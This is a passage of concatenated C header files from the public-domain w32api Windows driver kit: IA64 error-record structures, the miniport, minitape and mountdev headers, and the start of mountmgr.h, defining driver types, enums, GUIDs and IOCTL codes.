typedef union _ERROR_BUS_SPECIFIC_DATA {
  ULONGLONG BusSpecificData;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG LockAsserted:1;
    ULONGLONG DeferLogged:1;
    ULONGLONG IOQEmpty:1;
    ULONGLONG DeferredTransaction:1;
    ULONGLONG RetriedTransaction:1;
    ULONGLONG MemoryClaimedTransaction:1;
    ULONGLONG IOClaimedTransaction:1;
    ULONGLONG ResponseParitySignal:1;
    ULONGLONG DeferSignal:1;
    ULONGLONG HitMSignal:1;
    ULONGLONG HitSignal:1;
    ULONGLONG RequestBusFirstCycle:6;
    ULONGLONG RequestBusSecondCycle:6;
    ULONGLONG AddressParityBusFirstCycle:2;
    ULONGLONG AddressParityBusSecondCycle:2;
    ULONGLONG ResponseBus:3;
    ULONGLONG RequestParitySignalFirstCycle:1;
    ULONGLONG RequestParitySignalSecondCycle:1;
    ULONGLONG Reserved:32;
  } DUMMYSTRUCTNAME;
} ERROR_BUS_SPECIFIC_DATA, *PERROR_BUS_SPECIFIC_DATA;

#define ERROR_MEMORY_GUID {0xe429faf2, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_MEMORY_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG ErrorStatus:1;
    ULONGLONG PhysicalAddress:1;
    ULONGLONG AddressMask:1;
    ULONGLONG Node:1;
    ULONGLONG Card:1;
    ULONGLONG Module:1;
    ULONGLONG Bank:1;
    ULONGLONG Device:1;
    ULONGLONG Row:1;
    ULONGLONG Column:1;
    ULONGLONG BitPosition:1;
    ULONGLONG RequestorId:1;
    ULONGLONG ResponderId:1;
    ULONGLONG TargetId:1;
    ULONGLONG BusSpecificData:1;
    ULONGLONG OemId:1;
    ULONGLONG OemData:1;
    ULONGLONG Reserved:47;
  } DUMMYSTRUCTNAME;
} ERROR_MEMORY_VALID, *PERROR_MEMORY_VALID;

typedef struct _ERROR_MEMORY {
  ERROR_SECTION_HEADER Header;
  ERROR_MEMORY_VALID Valid;
  ERROR_STATUS ErrorStatus;
  ULONGLONG PhysicalAddress;
  ULONGLONG PhysicalAddressMask;
  USHORT Node;
  USHORT Card;
  USHORT Module;
  USHORT Bank;
  USHORT Device;
  USHORT Row;
  USHORT Column;
  USHORT BitPosition;
  ULONGLONG RequestorId;
  ULONGLONG ResponderId;
  ULONGLONG TargetId;
  ULONGLONG BusSpecificData;
  UCHAR OemId[16];
  ERROR_OEM_DATA OemData;
} ERROR_MEMORY, *PERROR_MEMORY;

#define ERROR_PCI_BUS_GUID {0xe429faf4, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_PCI_BUS_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG ErrorStatus:1;
    ULONGLONG ErrorType:1;
    ULONGLONG Id:1;
    ULONGLONG Address:1;
    ULONGLONG Data:1;
    ULONGLONG CmdType:1;
    ULONGLONG RequestorId:1;
    ULONGLONG ResponderId:1;
    ULONGLONG TargetId:1;
    ULONGLONG OemId:1;
    ULONGLONG OemData:1;
    ULONGLONG Reserved:53;
  } DUMMYSTRUCTNAME;
} ERROR_PCI_BUS_VALID, *PERROR_PCI_BUS_VALID;

typedef struct _ERROR_PCI_BUS_TYPE {
  UCHAR Type;
  UCHAR Reserved;
} ERROR_PCI_BUS_TYPE, *PERROR_PCI_BUS_TYPE;

#define PciBusUnknownError       ((UCHAR)0)
#define PciBusDataParityError    ((UCHAR)1)
#define PciBusSystemError        ((UCHAR)2)
#define PciBusMasterAbort        ((UCHAR)3)
#define PciBusTimeOut            ((UCHAR)4)
#define PciMasterDataParityError ((UCHAR)5)
#define PciAddressParityError    ((UCHAR)6)
#define PciCommandParityError    ((UCHAR)7)

typedef struct _ERROR_PCI_BUS_ID {
  UCHAR BusNumber;
  UCHAR SegmentNumber;
} ERROR_PCI_BUS_ID, *PERROR_PCI_BUS_ID;

typedef struct _ERROR_PCI_BUS {
  ERROR_SECTION_HEADER Header;
  ERROR_PCI_BUS_VALID Valid;
  ERROR_STATUS ErrorStatus;
  ERROR_PCI_BUS_TYPE Type;
  ERROR_PCI_BUS_ID Id;
  UCHAR Reserved[4];
  ULONGLONG Address;
  ULONGLONG Data;
  ULONGLONG CmdType;
  ULONGLONG RequestorId;
  ULONGLONG ResponderId;
  ULONGLONG TargetId;
  UCHAR OemId[16];
  ERROR_OEM_DATA OemData;
} ERROR_PCI_BUS, *PERROR_PCI_BUS;

#define ERROR_PCI_COMPONENT_GUID {0xe429faf6, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_PCI_COMPONENT_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG ErrorStatus:1;
    ULONGLONG Info:1;
    ULONGLONG MemoryMappedRegistersPairs:1;
    ULONGLONG ProgrammedIORegistersPairs:1;
    ULONGLONG RegistersDataPairs:1;
    ULONGLONG OemData:1;
    ULONGLONG Reserved:58;
  } DUMMYSTRUCTNAME;
} ERROR_PCI_COMPONENT_VALID, *PERROR_PCI_COMPONENT_VALID;

typedef struct _ERROR_PCI_COMPONENT_INFO {
  USHORT VendorId;
  USHORT DeviceId;
  UCHAR ClassCodeInterface;
  UCHAR ClassCodeSubClass;
  UCHAR ClassCodeBaseClass;
  UCHAR FunctionNumber;
  UCHAR DeviceNumber;
  UCHAR BusNumber;
  UCHAR SegmentNumber;
  UCHAR Reserved0;
  ULONG Reserved1;
} ERROR_PCI_COMPONENT_INFO, *PERROR_PCI_COMPONENT_INFO;

typedef struct _ERROR_PCI_COMPONENT {
  ERROR_SECTION_HEADER Header;
  ERROR_PCI_COMPONENT_VALID Valid;
  ERROR_STATUS ErrorStatus;
  ERROR_PCI_COMPONENT_INFO Info;
  ULONG MemoryMappedRegistersPairs;
  ULONG ProgrammedIORegistersPairs;
} ERROR_PCI_COMPONENT, *PERROR_PCI_COMPONENT;

#define ERROR_SYSTEM_EVENT_LOG_GUID {0xe429faf3, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_SYSTEM_EVENT_LOG_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG RecordId:1;
    ULONGLONG RecordType:1;
    ULONGLONG GeneratorId:1;
    ULONGLONG EVMRev:1;
    ULONGLONG SensorType:1;
    ULONGLONG SensorNum:1;
    ULONGLONG EventDirType:1;
    ULONGLONG EventData1:1;
    ULONGLONG EventData2:1;
    ULONGLONG EventData3:1;
    ULONGLONG Reserved:54;
  } DUMMYSTRUCTNAME;
} ERROR_SYSTEM_EVENT_LOG_VALID, *PSYSTEM_EVENT_LOG_VALID;

typedef struct _ERROR_SYSTEM_EVENT_LOG {
  ERROR_SECTION_HEADER Header;
  ERROR_SYSTEM_EVENT_LOG_VALID Valid;
  USHORT RecordId;
  UCHAR RecordType;
  ULONG TimeStamp;
  USHORT GeneratorId;
  UCHAR EVMRevision;
  UCHAR SensorType;
  UCHAR SensorNumber;
  UCHAR EventDir;
  UCHAR Data1;
  UCHAR Data2;
  UCHAR Data3;
} ERROR_SYSTEM_EVENT_LOG, *PERROR_SYSTEM_EVENT_LOG;

#define ERROR_SMBIOS_GUID {0xe429faf5, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_SMBIOS_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG EventType:1;
    ULONGLONG Length:1;
    ULONGLONG TimeStamp:1;
    ULONGLONG OemData:1;
    ULONGLONG Reserved:60;
  } DUMMYSTRUCTNAME;
} ERROR_SMBIOS_VALID, *PERROR_SMBIOS_VALID;

typedef UCHAR ERROR_SMBIOS_EVENT_TYPE, *PERROR_SMBIOS_EVENT_TYPE;

typedef struct _ERROR_SMBIOS {
  ERROR_SECTION_HEADER Header;
  ERROR_SMBIOS_VALID Valid;
  ERROR_SMBIOS_EVENT_TYPE EventType;
  UCHAR Length;
  ERROR_TIMESTAMP TimeStamp;
  ERROR_OEM_DATA OemData;
} ERROR_SMBIOS, *PERROR_SMBIOS;

#define ERROR_PLATFORM_SPECIFIC_GUID {0xe429faf7, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_PLATFORM_SPECIFIC_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG ErrorStatus:1;
    ULONGLONG RequestorId:1;
    ULONGLONG ResponderId:1;
    ULONGLONG TargetId:1;
    ULONGLONG BusSpecificData:1;
    ULONGLONG OemId:1;
    ULONGLONG OemData:1;
    ULONGLONG OemDevicePath:1;
    ULONGLONG Reserved:56;
  } DUMMYSTRUCTNAME;
} ERROR_PLATFORM_SPECIFIC_VALID, *PERROR_PLATFORM_SPECIFIC_VALID;

typedef struct _ERROR_PLATFORM_SPECIFIC {
  ERROR_SECTION_HEADER Header;
  ERROR_PLATFORM_SPECIFIC_VALID Valid;
  ERROR_STATUS ErrorStatus;
  ULONGLONG RequestorId;
  ULONGLONG ResponderId;
  ULONGLONG TargetId;
  ERROR_BUS_SPECIFIC_DATA BusSpecificData;
  UCHAR OemId[16];
  ERROR_OEM_DATA OemData;
} ERROR_PLATFORM_SPECIFIC, *PERROR_PLATFORM_SPECIFIC;

#define ERROR_PLATFORM_BUS_GUID {0xe429faf9, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_PLATFORM_BUS_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG ErrorStatus:1;
    ULONGLONG RequestorId:1;
    ULONGLONG ResponderId:1;
    ULONGLONG TargetId:1;
    ULONGLONG BusSpecificData:1;
    ULONGLONG OemId:1;
    ULONGLONG OemData:1;
    ULONGLONG OemDevicePath:1;
    ULONGLONG Reserved:56;
  } DUMMYSTRUCTNAME;
} ERROR_PLATFORM_BUS_VALID, *PERROR_PLATFORM_BUS_VALID;

typedef struct _ERROR_PLATFORM_BUS {
  ERROR_SECTION_HEADER Header;
  ERROR_PLATFORM_BUS_VALID Valid;
  ERROR_STATUS ErrorStatus;
  ULONGLONG RequestorId;
  ULONGLONG ResponderId;
  ULONGLONG TargetId;
  ERROR_BUS_SPECIFIC_DATA BusSpecificData;
  UCHAR OemId[16];
  ERROR_OEM_DATA OemData;
} ERROR_PLATFORM_BUS, *PERROR_PLATFORM_BUS;

#define ERROR_PLATFORM_HOST_CONTROLLER_GUID {0xe429faf8, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_PLATFORM_HOST_CONTROLLER_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG ErrorStatus:1;
    ULONGLONG RequestorId:1;
    ULONGLONG ResponderId:1;
    ULONGLONG TargetId:1;
    ULONGLONG BusSpecificData:1;
    ULONGLONG OemId:1;
    ULONGLONG OemData:1;
    ULONGLONG OemDevicePath:1;
    ULONGLONG Reserved:56;
  } DUMMYSTRUCTNAME;
} ERROR_PLATFORM_HOST_CONTROLLER_VALID, *PERROR_PLATFORM_HOST_CONTROLLER_VALID;

typedef struct _ERROR_PLATFORM_HOST_CONTROLLER {
  ERROR_SECTION_HEADER Header;
  ERROR_PCI_COMPONENT_VALID Valid;
  ERROR_STATUS ErrorStatus;
  ULONGLONG RequestorId;
  ULONGLONG ResponderId;
  ULONGLONG TargetId;
  ERROR_BUS_SPECIFIC_DATA BusSpecificData;
  UCHAR OemId[16];
  ERROR_OEM_DATA OemData;
} ERROR_PLATFORM_HOST_CONTROLLER, *PERROR_PLATFORM_HOST_CONTROLLER;

typedef ERROR_RECORD_HEADER ERROR_LOGRECORD, *PERROR_LOGRECORD;
typedef ERROR_RECORD_HEADER MCA_EXCEPTION, *PMCA_EXCEPTION;
typedef ERROR_RECORD_HEADER CMC_EXCEPTION, *PCMC_EXCEPTION;
typedef ERROR_RECORD_HEADER CPE_EXCEPTION, *PCPE_EXCEPTION;
#if (NTDDI_VERSION > NTDDI_WINXP)
typedef ERROR_RECORD_HEADER INIT_EXCEPTION, *PINIT_EXCEPTION;
#endif

#endif /* defined(_IA64_) */

#endif /* defined(_X86_) || defined(_IA64_) || defined(_AMD64_) */

```

`include/ddk/miniport.h`:

```h
/*
 * miniport.h
 *
 * Type definitions for miniport drivers
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef _MINIPORT_
#define _MINIPORT_

#ifdef __cplusplus
extern "C" {
#endif

#define EMULATOR_READ_ACCESS              0x01
#define EMULATOR_WRITE_ACCESS             0x02

typedef enum _EMULATOR_PORT_ACCESS_TYPE {
	Uchar,
	Ushort,
	Ulong
} EMULATOR_PORT_ACCESS_TYPE, *PEMULATOR_PORT_ACCESS_TYPE;


typedef struct _EMULATOR_ACCESS_ENTRY {
  ULONG  BasePort;
  ULONG  NumConsecutivePorts;
  EMULATOR_PORT_ACCESS_TYPE  AccessType;
  UCHAR  AccessMode;
  UCHAR  StringSupport;
  PVOID  Routine;
} EMULATOR_ACCESS_ENTRY, *PEMULATOR_ACCESS_ENTRY;

typedef VOID
(NTAPI *PBANKED_SECTION_ROUTINE)(
  IN ULONG  ReadBank,
  IN ULONG  WriteBank,
  IN PVOID  Context);

#ifndef __BROKEN__

typedef enum _INTERFACE_TYPE {
    InterfaceTypeUndefined = -1,
    Internal,
    Isa,
    Eisa,
    MicroChannel,
    TurboChannel,
    PCIBus,
    VMEBus,
    NuBus,
    PCMCIABus,
    CBus,
    MPIBus,
    MPSABus,
    ProcessorInternal,
    InternalPowerBus,
    PNPISABus,
    PNPBus,
    Vmcs,
    MaximumInterfaceType
}INTERFACE_TYPE, *PINTERFACE_TYPE;

typedef enum _KINTERRUPT_MODE {
    LevelSensitive,
    Latched
} KINTERRUPT_MODE;

typedef VOID (*PINTERFACE_REFERENCE)(PVOID Context);
typedef VOID (*PINTERFACE_DEREFERENCE)(PVOID Context);

typedef enum _BUS_DATA_TYPE {
    ConfigurationSpaceUndefined = -1,
    Cmos,
    EisaConfiguration,
    Pos,
    CbusConfiguration,
    PCIConfiguration,
    VMEConfiguration,
    NuBusConfiguration,
    PCMCIAConfiguration,
    MPIConfiguration,
    MPSAConfiguration,
    PNPISAConfiguration,
    SgiInternalConfiguration,
    MaximumBusDataType
} BUS_DATA_TYPE, *PBUS_DATA_TYPE;

typedef enum _DMA_WIDTH {
    Width8Bits,
    Width16Bits,
    Width32Bits,
    MaximumDmaWidth
}DMA_WIDTH, *PDMA_WIDTH;

typedef enum _DMA_SPEED {
    Compatible,
    TypeA,
    TypeB,
    TypeC,
    TypeF,
    MaximumDmaSpeed
}DMA_SPEED, *PDMA_SPEED;

typedef struct _INTERFACE {
    USHORT Size;
    USHORT Version;
    PVOID Context;
    PINTERFACE_REFERENCE InterfaceReference;
    PINTERFACE_DEREFERENCE InterfaceDereference;
} INTERFACE, *PINTERFACE;

typedef enum _IRQ_DEVICE_POLICY {
    IrqPolicyMachineDefault = 0,
    IrqPolicyAllCloseProcessors,
    IrqPolicyOneCloseProcessor,
    IrqPolicyAllProcessorsInMachine,
    IrqPolicySpecifiedProcessors,
    IrqPolicySpreadMessagesAcrossAllProcessors
} IRQ_DEVICE_POLICY, *PIRQ_DEVICE_POLICY;

typedef enum _IRQ_PRIORITY {
    IrqPriorityUndefined = 0,
    IrqPriorityLow,
    IrqPriorityNormal,
    IrqPriorityHigh
} IRQ_PRIORITY, *PIRQ_PRIORITY;

typedef struct _IO_RESOURCE_DESCRIPTOR {
    UCHAR Option;
    UCHAR Type;                         // use CM_RESOURCE_TYPE
    UCHAR ShareDisposition;             // use CM_SHARE_DISPOSITION
    UCHAR Spare1;
    USHORT Flags;                       // use CM resource flag defines
    USHORT Spare2;                      // align

    union {
        struct {
            ULONG Length;
            ULONG Alignment;
            PHYSICAL_ADDRESS MinimumAddress;
            PHYSICAL_ADDRESS MaximumAddress;
        } Port;

        struct {
            ULONG Length;
            ULONG Alignment;
            PHYSICAL_ADDRESS MinimumAddress;
            PHYSICAL_ADDRESS MaximumAddress;
        } Memory;

        struct {
            ULONG MinimumVector;
            ULONG MaximumVector;
            IRQ_DEVICE_POLICY AffinityPolicy;
            IRQ_PRIORITY PriorityPolicy;
            KAFFINITY TargetedProcessors;
        } Interrupt;

        struct {
            ULONG MinimumChannel;
            ULONG MaximumChannel;
        } Dma;

        struct {
            ULONG Length;
            ULONG Alignment;
            PHYSICAL_ADDRESS MinimumAddress;
            PHYSICAL_ADDRESS MaximumAddress;
        } Generic;

        struct {
            ULONG Data[3];
        } DevicePrivate;

        //
        // Bus Number information.
        //

        struct {
            ULONG Length;
            ULONG MinBusNumber;
            ULONG MaxBusNumber;
            ULONG Reserved;
        } BusNumber;

        struct {
            ULONG Priority;   // use LCPRI_Xxx values in cfg.h
            ULONG Reserved1;
            ULONG Reserved2;
        } ConfigData;

        //
        // The following structures provide descriptions
        // for memory resource requirement greater than MAXULONG
        //

        struct {
            ULONG Length40;
            ULONG Alignment40;
            PHYSICAL_ADDRESS MinimumAddress;
            PHYSICAL_ADDRESS MaximumAddress;
        } Memory40;

        struct {
            ULONG Length48;
            ULONG Alignment48;
            PHYSICAL_ADDRESS MinimumAddress;
            PHYSICAL_ADDRESS MaximumAddress;
        } Memory48;

        struct {
            ULONG Length64;
            ULONG Alignment64;
            PHYSICAL_ADDRESS MinimumAddress;
            PHYSICAL_ADDRESS MaximumAddress;
        } Memory64;

    } u;

} IO_RESOURCE_DESCRIPTOR, *PIO_RESOURCE_DESCRIPTOR;

#include <guiddef.h>
#endif /* ! __BROKEN__ */

#ifdef __cplusplus
}
#endif

#endif /* __MINIPORT_H */

```

`include/ddk/minitape.h`:

```h
/*
 * minitape.h
 *
 * Minitape driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */
#ifndef __MINITAPE_H
#define __MINITAPE_H

#ifdef __cplusplus
extern "C" {
#endif

#pragma pack(push,4)

#define MEDIA_ERASEABLE                   0x00000001
#define MEDIA_WRITE_ONCE                  0x00000002
#define MEDIA_READ_ONLY                   0x00000004
#define MEDIA_READ_WRITE                  0x00000008
#define MEDIA_WRITE_PROTECTED             0x00000100
#define MEDIA_CURRENTLY_MOUNTED           0x80000000

typedef enum _TAPE_STATUS {
	TAPE_STATUS_SEND_SRB_AND_CALLBACK,
	TAPE_STATUS_CALLBACK,
	TAPE_STATUS_CHECK_TEST_UNIT_READY,
	TAPE_STATUS_SUCCESS,
	TAPE_STATUS_INSUFFICIENT_RESOURCES,
	TAPE_STATUS_NOT_IMPLEMENTED,
	TAPE_STATUS_INVALID_DEVICE_REQUEST,
	TAPE_STATUS_INVALID_PARAMETER,
	TAPE_STATUS_MEDIA_CHANGED,
	TAPE_STATUS_BUS_RESET,
	TAPE_STATUS_SETMARK_DETECTED,
	TAPE_STATUS_FILEMARK_DETECTED,
	TAPE_STATUS_BEGINNING_OF_MEDIA,
	TAPE_STATUS_END_OF_MEDIA,
	TAPE_STATUS_BUFFER_OVERFLOW,
	TAPE_STATUS_NO_DATA_DETECTED,
	TAPE_STATUS_EOM_OVERFLOW,
	TAPE_STATUS_NO_MEDIA,
	TAPE_STATUS_IO_DEVICE_ERROR,
	TAPE_STATUS_UNRECOGNIZED_MEDIA,
	TAPE_STATUS_DEVICE_NOT_READY,
	TAPE_STATUS_MEDIA_WRITE_PROTECTED,
	TAPE_STATUS_DEVICE_DATA_ERROR,
	TAPE_STATUS_NO_SUCH_DEVICE,
	TAPE_STATUS_INVALID_BLOCK_LENGTH,
	TAPE_STATUS_IO_TIMEOUT,
	TAPE_STATUS_DEVICE_NOT_CONNECTED,
	TAPE_STATUS_DATA_OVERRUN,
	TAPE_STATUS_DEVICE_BUSY,
	TAPE_STATUS_REQUIRES_CLEANING,
	TAPE_STATUS_CLEANER_CARTRIDGE_INSTALLED
} TAPE_STATUS, *PTAPE_STATUS;

#define INQUIRYDATABUFFERSIZE 36
#ifndef _INQUIRYDATA_DEFINED /* also in scsi.h */
#define _INQUIRYDATA_DEFINED
typedef struct _INQUIRYDATA {
	UCHAR  DeviceType : 5;
	UCHAR  DeviceTypeQualifier : 3;
	UCHAR  DeviceTypeModifier : 7;
	UCHAR  RemovableMedia : 1;
	__GNU_EXTENSION union {
		UCHAR  Versions;
		__GNU_EXTENSION struct {
			UCHAR  ANSIVersion : 3;
			UCHAR  ECMAVersion : 3;
			UCHAR  ISOVersion : 2;
		};
	};
	UCHAR  ResponseDataFormat : 4;
	UCHAR  HiSupport : 1;
	UCHAR  NormACA : 1;
	UCHAR  TerminateTask : 1;
	UCHAR  AERC : 1;
	UCHAR  AdditionalLength;
	UCHAR  Reserved;
	UCHAR  Addr16 : 1;
	UCHAR  Addr32 : 1;
	UCHAR  AckReqQ: 1;
	UCHAR  MediumChanger : 1;
	UCHAR  MultiPort : 1;
	UCHAR  ReservedBit2 : 1;
	UCHAR  EnclosureServices : 1;
	UCHAR  ReservedBit3 : 1;
	UCHAR  SoftReset : 1;
	UCHAR  CommandQueue : 1;
	UCHAR  TransferDisable : 1;
	UCHAR  LinkedCommands : 1;
	UCHAR  Synchronous : 1;
	UCHAR  Wide16Bit : 1;
	UCHAR  Wide32Bit : 1;
	UCHAR  RelativeAddressing : 1;
	UCHAR  VendorId[8];
	UCHAR  ProductId[16];
	UCHAR  ProductRevisionLevel[4];
	UCHAR  VendorSpecific[20];
	UCHAR  Reserved3[40];
} INQUIRYDATA, *PINQUIRYDATA;
#endif

typedef struct _MODE_CAPABILITIES_PAGE {
	UCHAR PageCode : 6;
	UCHAR Reserved1 : 2;
	UCHAR PageLength;
	UCHAR Reserved2[2];
	UCHAR RO : 1;
	UCHAR Reserved3 : 4;
	UCHAR SPREV : 1;
	UCHAR Reserved4 : 2;
	UCHAR Reserved5 : 3;
	UCHAR EFMT : 1;
	UCHAR Reserved6 : 1;
	UCHAR QFA : 1;
	UCHAR Reserved7 : 2;
	UCHAR LOCK : 1;
	UCHAR LOCKED : 1;
	UCHAR PREVENT : 1;
	UCHAR UNLOAD : 1;
	UCHAR Reserved8 : 2;
	UCHAR ECC : 1;
	UCHAR CMPRS : 1;
	UCHAR Reserved9 : 1;
	UCHAR BLK512 : 1;
	UCHAR BLK1024 : 1;
	UCHAR Reserved10 : 4;
	UCHAR SLOWB : 1;
	UCHAR MaximumSpeedSupported[2];
	UCHAR MaximumStoredDefectedListEntries[2];
	UCHAR ContinuousTransferLimit[2];
	UCHAR CurrentSpeedSelected[2];
	UCHAR BufferSize[2];
	UCHAR Reserved11[2];
} MODE_CAPABILITIES_PAGE, *PMODE_CAPABILITIES_PAGE;

typedef BOOLEAN NTAPI
(*TAPE_VERIFY_INQUIRY_ROUTINE)(
	IN PINQUIRYDATA  InquiryData,
	IN PMODE_CAPABILITIES_PAGE ModeCapabilitiesPage);

typedef VOID NTAPI
(*TAPE_EXTENSION_INIT_ROUTINE)(
  IN PVOID  MinitapeExtension,
  IN PINQUIRYDATA  InquiryData,
  IN PMODE_CAPABILITIES_PAGE  ModeCapabilitiesPage);

typedef VOID NTAPI
(*TAPE_ERROR_ROUTINE)(
    IN PVOID  MinitapeExtension,
    IN PSCSI_REQUEST_BLOCK  Srb,
    IN OUT PTAPE_STATUS  TapeStatus);

typedef TAPE_STATUS NTAPI
(*TAPE_PROCESS_COMMAND_ROUTINE)(
  IN OUT PVOID  MinitapeExtension,
  IN OUT PVOID  CommandExtension,
  IN OUT PVOID  CommandParameters,
  IN OUT PSCSI_REQUEST_BLOCK  Srb,
  IN ULONG  CallNumber,
  IN TAPE_STATUS  StatusOfLastCommand,
  IN OUT PULONG  RetryFlags);

#define TAPE_RETRY_MASK                   0x0000FFFF
#define IGNORE_ERRORS                     0x00010000
#define RETURN_ERRORS                     0x00020000

typedef struct _TAPE_INIT_DATA {
  TAPE_VERIFY_INQUIRY_ROUTINE  VerifyInquiry;
  BOOLEAN  QueryModeCapabilitiesPage;
  ULONG  MinitapeExtensionSize;
  TAPE_EXTENSION_INIT_ROUTINE  ExtensionInit;
  ULONG  DefaultTimeOutValue;
  TAPE_ERROR_ROUTINE  TapeError;
  ULONG  CommandExtensionSize;
  TAPE_PROCESS_COMMAND_ROUTINE  CreatePartition;
  TAPE_PROCESS_COMMAND_ROUTINE  Erase;
  TAPE_PROCESS_COMMAND_ROUTINE  GetDriveParameters;
  TAPE_PROCESS_COMMAND_ROUTINE  GetMediaParameters;
  TAPE_PROCESS_COMMAND_ROUTINE  GetPosition;
  TAPE_PROCESS_COMMAND_ROUTINE  GetStatus;
  TAPE_PROCESS_COMMAND_ROUTINE  Prepare;
  TAPE_PROCESS_COMMAND_ROUTINE  SetDriveParameters;
  TAPE_PROCESS_COMMAND_ROUTINE  SetMediaParameters;
  TAPE_PROCESS_COMMAND_ROUTINE  SetPosition;
  TAPE_PROCESS_COMMAND_ROUTINE  WriteMarks;
  TAPE_PROCESS_COMMAND_ROUTINE  PreProcessReadWrite; /* optional */
} TAPE_INIT_DATA, *PTAPE_INIT_DATA;

typedef struct _TAPE_PHYS_POSITION {
	ULONG  SeekBlockAddress;
	ULONG  SpaceBlockCount;
} TAPE_PHYS_POSITION, PTAPE_PHYS_POSITION;

#pragma pack(pop)

#ifdef __cplusplus
}
#endif

#endif /* __MINITAPE_H */

```

`include/ddk/mountdev.h`:

```h
#ifndef _MOUNTDEV_
#define _MOUNTDEV_

#include <mountmgr.h>

#if (NTDDI_VERSION >= NTDDI_WIN2K)

#define IOCTL_MOUNTDEV_QUERY_UNIQUE_ID            CTL_CODE(MOUNTDEVCONTROLTYPE, 0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MOUNTDEV_QUERY_SUGGESTED_LINK_NAME  CTL_CODE(MOUNTDEVCONTROLTYPE, 3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MOUNTDEV_LINK_CREATED               CTL_CODE(MOUNTDEVCONTROLTYPE, 4, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MOUNTDEV_LINK_DELETED               CTL_CODE(MOUNTDEVCONTROLTYPE, 5, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _MOUNTDEV_UNIQUE_ID {
  USHORT UniqueIdLength;
  UCHAR UniqueId[1];
} MOUNTDEV_UNIQUE_ID, *PMOUNTDEV_UNIQUE_ID;

typedef struct _MOUNTDEV_SUGGESTED_LINK_NAME {
  BOOLEAN UseOnlyIfThereAreNoOtherLinks;
  USHORT NameLength;
  WCHAR Name[1];
} MOUNTDEV_SUGGESTED_LINK_NAME, *PMOUNTDEV_SUGGESTED_LINK_NAME;

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

#define IOCTL_MOUNTDEV_QUERY_STABLE_GUID          CTL_CODE(MOUNTDEVCONTROLTYPE, 6, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _MOUNTDEV_STABLE_GUID {
  GUID StableGuid;
} MOUNTDEV_STABLE_GUID, *PMOUNTDEV_STABLE_GUID;

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

/* FIXME : These definitions don't exist in the official header : */
#define IOCTL_MOUNTDEV_UNIQUE_ID_CHANGE_NOTIFY    CTL_CODE(MOUNTDEVCONTROLTYPE, 1, METHOD_BUFFERED, FILE_ANY_ACCESS)
typedef struct _MOUNTDEV_UNIQUE_ID_CHANGE_NOTIFY_OUTPUT {
  ULONG Size;
  USHORT OldUniqueIdOffset;
  USHORT OldUniqueIdLength;
  USHORT NewUniqueIdOffset;
  USHORT NewUniqueIdLength;
} MOUNTDEV_UNIQUE_ID_CHANGE_NOTIFY_OUTPUT, *PMOUNTDEV_UNIQUE_ID_CHANGE_NOTIFY_OUTPUT;


#endif /* _MOUNTDEV_ */

```

`include/ddk/mountmgr.h`:

```h
#ifndef _MOUNTMGR_
#define _MOUNTMGR_

#if (NTDDI_VERSION >= NTDDI_WIN2K)

#if defined(DEFINE_GUID)
DEFINE_GUID(MOUNTDEV_MOUNTED_DEVICE_GUID, 0x53F5630D, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#define MOUNTMGR_DEVICE_NAME L"\\Device\\MountPointManager"
